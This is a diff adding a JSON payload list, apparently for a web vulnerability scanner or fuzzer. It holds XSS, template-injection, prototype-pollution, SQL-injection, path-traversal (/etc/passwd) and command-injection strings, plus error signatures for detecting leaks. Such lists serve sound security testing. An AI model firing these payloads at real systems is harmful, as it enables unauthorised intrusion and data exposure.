@@ -1,0 +1,60 @@
+{
+  "js_breakers": [
+    "';alert(document.domain)//",
+    "\";alert(document.domain)//",
+    "<script>alert(document.domain)</script>",
+    "<img src=x onerror=alert(document.domain)>",
+    "<svg onload=alert(document.domain)>",
+    "jaVasCript:alert(document.domain)",
+    "{{7*7}}",
+    "${7*7}",
+    "{{constructor.constructor('alert(document.domain)')()}}",
+    "__proto__[0]=1",
+    "Array.prototype.map = () => { throw 'RaptorX was here'; }",
+    "Object.prototype.toString = () => { throw 'Stack trace leaked!'; }"
+  ],
+  "error_triggers": [
+    "{% if 1==1 %}{{7*7}}{% endif %}",
+    "{{7*'7'}}",
+    "{{[1,2,3][100]}}",
+    "__proto__.x=1",
+    "constructor.prototype.x=1",
+    "JSON.parse('{\"a\":' + (function(){throw 'pwned'})() + '}')",
+    "undefined[0]",
+    "null.toString()"
+  ],
+  "traceback_leaks": [
+    "Traceback (most recent call last)",
+    "Exception in thread",
+    "Uncaught TypeError",
+    "Uncaught ReferenceError",
+    "PHP Fatal error",
+    "PHP Notice",
+    "SQL syntax error",
+    "undefined offset",
+    "Cannot read property 'x' of undefined",
+    "TypeError: Cannot read properties of null",
+    "ReferenceError: x is not defined",
+    "Error: ENOENT: no such file or directory"
+  ],
+  "prototype_pollution": [
+    "__proto__.isAdmin=true",
+    "constructor.prototype.isAdmin=true",
+    "JSON.parse('{\"__proto__\":{\"isAdmin\":true}}')"
+  ],
+  "sql_injection": [
+    "' OR 1=1--",
+    "\" OR 1=1--",
+    "' UNION SELECT NULL,NULL,NULL--"
+  ],
+  "file_inclusion": [
+    "../../../../etc/passwd",
+    "/etc/passwd",
+    "php://filter/read=convert.base64-encode/resource=index.php"
+  ],
+  "command_injection": [
+    ";ls",
+    "|whoami",
+    "&&id"
+  ]
+}
